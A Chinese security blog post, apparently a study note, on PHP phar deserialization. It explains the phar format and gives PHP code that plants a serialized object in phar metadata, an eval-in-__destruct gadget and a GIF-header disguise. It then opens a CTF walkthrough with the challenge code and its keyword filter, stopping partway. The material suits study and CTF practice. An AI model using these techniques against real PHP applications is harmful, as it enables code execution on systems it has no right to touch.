<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>phar反序列化 | Co0kieslover</title><meta name="author" content="一个网安小兵Co0kieslover"><meta name="copyright" content="一个网安小兵Co0kieslover"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Phar反序列化一，phar文件结构1. a stub可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2.  manifestphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这">
<meta property="og:type" content="article">
<meta property="og:title" content="phar反序列化">
<meta property="og:url" content="http://example.com/2025/10/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Co0kieslover">
<meta property="og:description" content="Phar反序列化一，phar文件结构1. a stub可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2.  manifestphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/d36357b9062eb3273d6f3f72477577d1.jpg">
<meta property="article:published_time" content="2025-10-22T13:06:57.000Z">
<meta property="article:modified_time" content="2025-10-22T14:00:50.267Z">
<meta property="article:author" content="一个网安小兵Co0kieslover">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="安全漏洞">
<meta property="article:tag" content="Phar">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/d36357b9062eb3273d6f3f72477577d1.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "phar反序列化",
  "url": "http://example.com/2025/10/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
  "image": "http://example.com/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/d36357b9062eb3273d6f3f72477577d1.jpg",
  "datePublished": "2025-10-22T13:06:57.000Z",
  "dateModified": "2025-10-22T14:00:50.267Z",
  "author": [
    {
      "@type": "Person",
      "name": "一个网安小兵Co0kieslover",
      "url": "http://example.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="http://example.com/2025/10/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'phar反序列化',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #FF7F50;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0/"><i class="fa-fw fas fa-pencil"></i><span> 每日学习</span></a></li><li><a class="site-page child" href="/categories/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><i class="fa-fw fas fa-flag"></i><span> 赛题复现</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 来听音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 一些照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/d36357b9062eb3273d6f3f72477577d1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/./1.jpg" alt="Logo"><span class="site-name">Co0kieslover</span></a><a class="nav-page-title" href="/"><span class="site-name">phar反序列化</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0/"><i class="fa-fw fas fa-pencil"></i><span> 每日学习</span></a></li><li><a class="site-page child" href="/categories/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><i class="fa-fw fas fa-flag"></i><span> 赛题复现</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 来听音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 一些照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">phar反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-22T13:06:57.000Z" title="发表于 2025-10-22 21:06:57">2025-10-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-22T14:00:50.267Z" title="更新于 2025-10-22 22:00:50">2025-10-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0/">每日学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h2><h4 id="一，phar文件结构"><a href="#一，phar文件结构" class="headerlink" title="一，phar文件结构"></a>一，phar文件结构</h4><h5 id="1-a-stub"><a href="#1-a-stub" class="headerlink" title="1. a stub"></a>1. a <strong>stub</strong></h5><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<h5 id="2-manifest"><a href="#2-manifest" class="headerlink" title="2.  manifest"></a>2.  <strong>manifest</strong></h5><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<h5 id="3-the-file-contents"><a href="#3-the-file-contents" class="headerlink" title="3. the file contents"></a>3. the file <strong>contents</strong></h5><p>被压缩文件的内容。</p>
<h5 id="4-signature"><a href="#4-signature" class="headerlink" title="4.  signature"></a>4.  <strong>signature</strong></h5><p>签名，放在文件末尾，格式如下：</p>
<h4 id="二，demo测试"><a href="#二，demo测试" class="headerlink" title="二，demo测试"></a>二，demo测试</h4><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p>
<p>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//startBuffering 是 Phar 对象的一个方法。这行代码的作用是开始对 Phar 对象进行缓冲操作</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//signature签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//停止 Phar 对象的缓冲操作,完成实际的归档构建</span></span><br></pre></td></tr></table></figure>

<p>这样的话就在当前目录下生成了一个test.phar文件（我用的是phpstudy搭建的测试环境）</p>
<p><img src="/../image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250707111856264.png" alt="image-20250707111856264"></p>
<p>我们来看一下这个phar文件的内容，对照上面我们了解的phar文件的结构</p>
<p>首先是一个标志</p>
<p>接着mainifest部分，可以明显的看到meta-data是以序列化的形式存储的：</p>
<p><img src="/../image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250707112105960.png" alt="image-20250707112105960"></p>
<p>有序列化数据必然会有反序列化操作，php一大部分的<a target="_blank" rel="noopener" href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th>受影响函数列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody></table>
<p>接下来我们来测试用其中一个测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar://test.phar/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/../image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250707112824805.png" alt="image-20250707112824805"></p>
<p>也验证了我们刚刚说的</p>
<p>大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;phar://test.phar/flag.txt&#x27;</span>;</span><br><span class="line"><span class="comment">//echo file_get_contents($filename);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fileatime</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="comment">//echo file_exists($filename);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不过用其他文件系统函数的话，就会the file contents部分就出现了变化，但是meta-data部分仍然了进行反序列化</p>
<p><img src="/../image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250707154007035.png" alt="image-20250707154007035"></p>
<h4 id="三，将phar伪造成其他格式的文件"><a href="#三，将phar伪造成其他格式的文件" class="headerlink" title="三，将phar伪造成其他格式的文件"></a>三，将phar伪造成其他格式的文件</h4><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//startBuffering 是 Phar 对象的一个方法。这行代码的作用是开始对 Phar 对象进行缓冲操作</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF86a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//signature签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//停止 Phar 对象的缓冲操作,完成实际的归档构建</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250707154831429.png" alt="image-20250707154831429"></p>
<h4 id="四，实战"><a href="#四，实战" class="headerlink" title="四，实战"></a>四，实战</h4><h2 id="prize-p1"><a href="#prize-p1" class="headerlink" title="prize_p1"></a>prize_p1</h2><p>首先看代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getflag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//最终目标：反序列化后GC触发，调用，拿到flag</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$config</span>;<span class="comment">//控制后续操作</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//对象销毁时使用，根据$config的值执行不同的操作</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;config == <span class="string">&#x27;w&#x27;</span>) &#123;<span class="comment">//写入文件</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./tmp/a.txt&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;config == <span class="string">&#x27;r&#x27;</span>) &#123;<span class="comment">//读取写入</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">0</span>]);<span class="comment">//这里可以用来控制$config来实现写入文件还是读取文件</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;那么就从这里开始起航吧&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>可以上传两个变量，一个post一个get</p>
<p>因为get里面过滤了getflag。我们不能直接get传参序列化数据，直接反序列化触发getflag</p>
<p>我们用的方法就是post上传phar文件，再file_get_contents用phar协议读取（反序列化）</p>
<p>反序列化class getflag ，从而触发__destruct魔术方法拿到flag</p>
<p><strong>我们先来生成phar文件</strong></p>
<h4 id="初步确定phar文件"><a href="#初步确定phar文件" class="headerlink" title="初步确定phar文件"></a>初步确定phar文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 将当前PHP文件的内容进行语法高亮并输出到页面上</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getflag</span> // 定义一个名为 <span class="title">Testobj</span> 的类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="comment">// 声明一个属性 $output，初始值为空字符串</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">// 删除之前的 test.phar 文件(如果有)，@ 符号用于抑制可能出现的文件不存在的警告</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">// 创建一个名为 test.phar 的 PHAR 文件对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">// 开始写入 PHAR 文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">// 使用 setStub 方法设置 PHAR 文件的启动器（stub），__HALT_COMPILER(); 是 PHP 的特殊标记，表示文件编译的结束</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getflag</span>(); <span class="comment">// 创建了一个 Testobj 类的实例</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">// 将 $o 对象作为元数据写入到 PHAR 文件中，这种方法不再安全，可能导致安全漏洞</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);  <span class="comment">// 向 PHAR 文件中添加一个名为 test.txt 的文件，文件内容为字符串 &quot;test&quot;</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">// 停止写入 PHAR 文件</span></span><br></pre></td></tr></table></figure>

<p>可以看到post里面也过滤了getflag</p>
<p>我们知道生成的phar的metadata的序列化数据是明文，所以只这样肯定是不行的</p>
